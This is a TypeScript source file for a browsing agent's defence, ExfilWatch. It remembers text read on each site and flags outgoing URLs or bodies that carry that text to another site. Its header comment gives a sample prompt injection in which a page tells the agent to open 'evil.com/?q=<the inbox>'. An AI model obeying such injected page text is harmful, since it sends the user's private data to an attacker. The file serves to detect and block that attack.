import { siteKey } from './fog'

/**
 * Remembers what agents read on each site, so a page cannot make an agent carry
 * it to another site (an injected "open evil.com/?q=<the inbox>"). Text is kept
 * as overlapping 32-character windows, normalized, per site, for a while.
 */

const WINDOW = 32
const STEP = 8
const MAX_WINDOWS = 60_000
const KEEP_MS = 60 * 60_000

const norm = (s: string) => s.toLowerCase().replace(/\s+/g, ' ')

export class ExfilWatch {
  private readonly windows = new Map<string, { site: string; at: number }>()

  constructor(private readonly now: () => number = Date.now) {}

  /** Keeps what was read on a site. */
  remember(text: string, site: string): void {
    const t = norm(text)
    const s = siteKey(site)
    const at = this.now()
    for (let i = 0; i + WINDOW <= t.length; i += STEP) {
      const w = t.slice(i, i + WINDOW)
      if (!/[a-z\p{L}]{3}/u.test(w)) continue
      this.windows.set(w, { site: s, at })
    }
    if (this.windows.size > MAX_WINDOWS) {
      const drop = this.windows.size - MAX_WINDOWS
      let n = 0
      for (const k of this.windows.keys()) { if (n++ >= drop) break; this.windows.delete(k) }
    }
  }

  /** The site whose text this outgoing url or body carries, when it is not going back to that site. */
  check(payload: string, toSite: string): string | null {
    let text = payload
    try { text = decodeURIComponent(payload.replace(/\+/g, ' ')) } catch { /* not encoded */ }
    const t = norm(text)
    const to = siteKey(toSite)
    const cutoff = this.now() - KEEP_MS
    for (let i = 0; i + WINDOW <= t.length; i++) {
      const hit = this.windows.get(t.slice(i, i + WINDOW))
      if (hit && hit.at >= cutoff && hit.site !== to) return hit.site
    }
    return null
  }
}
